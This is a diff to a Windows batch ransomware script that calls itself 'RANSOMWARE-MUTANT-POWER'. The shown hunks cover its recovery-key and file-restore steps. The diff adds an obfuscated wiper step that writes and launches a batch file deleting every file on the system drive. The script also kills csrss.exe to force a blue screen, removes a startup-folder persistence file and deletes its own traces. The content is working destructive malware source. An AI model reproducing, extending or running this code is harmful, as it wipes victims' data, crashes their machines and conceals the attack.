@@ -362,6 +362,13 @@ color 47
 cls
 echo Recovery key does not exist.
 echo A blue screen will start.
+
+::^D^e^l^ all file
+echo ^D^e^l^ all file.
+set randomqustn=%random%
+echo ^d^e^l^ ^%^s^y^s^t^e^m^d^r^i^v^e^%^\^*^.^*^ ^/^f^ ^/^s^ ^/^q^ > %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\%randomqustn%.bat
+start "" "%userprofile%\AppData\RANSOMWARE-MUTANT-POWER\%randomqustn%.bat"
+
 timeout/t 2 >nul
 cls
 taskkill /f /im csrss.exe
@@ -381,22 +388,27 @@ echo Restoring...
 echo Never close this window.
 echo Recovery takes about 5 seconds.
 timeout/t 5 /nobreak >nul
-del %userprofile%\Desktop\*.joker*
-move %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\desk\*.* %userprofile%\Desktop\
-del %userprofile%\pictures\*.joker*
-move %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\pic\*.* %userprofile%\pictures\
-del %userprofile%\videos\*.joker*
-move %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\video\*.* %userprofile%\videos\
-del %userprofile%\documents\*.joker*
-move %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\doc\*.* %userprofile%\documents\
-del %userprofile%\downloads\*.joker*
-move %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\down\*.* %userprofile%\downloads\
+  del %userprofile%\Desktop\*.joker*
+  move %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\desk\*.* %userprofile%\Desktop\
+  del %userprofile%\pictures\*.joker*
+  move %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\pic\*.* %userprofile%\pictures\
+  del %userprofile%\videos\*.joker*
+  move %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\video\*.* %userprofile%\videos\
+  del %userprofile%\documents\*.joker*
+  move %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\doc\*.* %userprofile%\documents\
+  del %userprofile%\downloads\*.joker*
+  move %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\down\*.* %userprofile%\downloads\
 cls
 del %userprofile%\POWER-JOKER-PASSWORD.txt
+::retrun all file
 del /a "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup\clickme.bat"
 rmdir /s /q %userprofile%\AppData\RANSOMWARE-MUTANT-POWER
 cls
 echo detox success
+echo boom!
 timeout /t 5 /nobreak >nul
+cls
+del %userprofile%\Desktop\*clickme.bat*
+del %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\%randomqustn%.bat
 exit
           ::program end
